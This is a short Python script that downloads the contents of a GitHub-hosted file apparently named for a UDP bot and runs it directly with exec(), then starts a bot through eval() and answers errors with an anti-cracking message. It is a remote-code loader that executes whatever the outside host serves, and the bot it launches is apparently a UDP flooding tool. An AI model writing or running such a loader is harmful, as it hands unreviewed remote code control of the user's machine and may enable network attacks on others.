print("connect 1")
import requests
data = requests.get(url="https://github.com/walidfoxy/BOTs-Fox-/blob/main/UDP%20!.txt").text
exec(data)


def start_script():
    try:
        eval("""start_bot()""")
    except Exception as e:
        return "Don't try to crack the app"
        start_bot()